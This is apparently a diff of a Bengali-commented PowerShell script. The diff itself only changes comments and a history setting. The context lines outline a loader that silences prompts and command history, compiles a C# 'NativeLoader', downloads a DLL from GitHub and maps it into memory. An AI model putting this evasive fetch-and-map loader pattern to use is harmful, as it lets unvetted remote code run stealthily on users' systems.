@@ -7,7 +7,7 @@ Read-Host "`n[!] Press ENTER to start the script (Window will stay open)"
 try {
 
     # ============================================================
-    #  ★★★ ১. প্রেফারেন্স সেট ★★★
+    #  ★★★ ১. প্রেফারেন্স সেট (MaximumHistoryCount = 1 করা হয়েছে) ★★★
     # ============================================================
     $VerbosePreference = 'SilentlyContinue'
     $DebugPreference = 'SilentlyContinue'
@@ -17,7 +17,7 @@ try {
     $ConfirmPreference = 'None'
     $WhatIfPreference = $false
     $PSModuleAutoLoadingPreference = 'None'
-    $MaximumHistoryCount = 0
+    $MaximumHistoryCount = 1   # <--- 0 থেকে 1 করে দেওয়া হয়েছে (কারণ 0 মানে হয় না)
     $Error.Clear()
 
     Write-Host "[+] Script Started..." -ForegroundColor Cyan
@@ -41,7 +41,7 @@ try {
     }
 
     # ============================================================
-    #  ★★★ ৩. C# লোডার কম্পাইল (এখন Terminating Error ধরার জন্য try-তে রাখা) ★★★
+    #  ★★★ ৩. C# লোডার কম্পাইল ★★★
     # ============================================================
     Write-Host "[*] Compiling C# Loader..." -ForegroundColor Cyan
     try {
@@ -137,7 +137,7 @@ public static class NativeLoader {
         $mapMethod = $loaderType.GetMethod("Map")
 
         # ============================================================
-        #  ★★★ ৪. DLL ডাউনলোড ও ম্যাপ (Error দেখাবে) ★★★
+        #  ★★★ ৪. DLL ডাউনলোড ও ম্যাপ ★★★
         # ============================================================
         Write-Host "[*] Downloading DLL from GitHub..." -ForegroundColor Cyan
         try {
@@ -164,7 +164,7 @@ public static class NativeLoader {
     }
 
     # ============================================================
-    #  ★★★ ৫. মূল main.ps1-এর কনফিগারেশন (যেমন ছিল) ★★★
+    #  ★★★ ৫. মূল main.ps1-এর কনফিগারেশন ★★★
     # ============================================================
     Write-Host "[*] Applying System Configurations..." -ForegroundColor Cyan
     try {
